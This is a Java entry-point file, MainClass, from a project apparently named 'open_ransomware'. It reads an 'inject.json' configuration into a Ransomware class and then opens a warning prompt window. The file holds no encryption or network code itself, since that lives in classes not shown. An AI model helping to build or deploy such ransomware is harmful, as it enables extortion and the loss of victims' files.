package com.bechris100.open_ransomware;

import com.bechris100.open_ransomware.software.Ransomware;
import com.bechris100.open_ransomware.utils.RuntimeEnvironment;
import com.bechris100.open_ransomware.windows.WarningPrompt;

import java.io.IOException;
import java.io.InputStream;

public class MainClass {

    private static void loadInjectJson() throws IOException {
        InputStream is = ResourceManager.getResourceInputStream("res/inject.json");
        StringBuilder str = new StringBuilder();
        int data;

        while ((data = is.read()) != -1)
            str.append((char) data);

        is.close();
        Ransomware.applyInjectJson(str.toString());
    }

    public static void main(String[] args) {
        boolean loadedConfig = false;

        try {
            loadInjectJson();
            loadedConfig = true;
        } catch (IOException ignored) {
        }

        if (!loadedConfig) {
            System.err.println("Something went wrong with loading the Configuration file for this Program.");
            System.exit(1);
        }

        new WarningPrompt().show();
    }

}
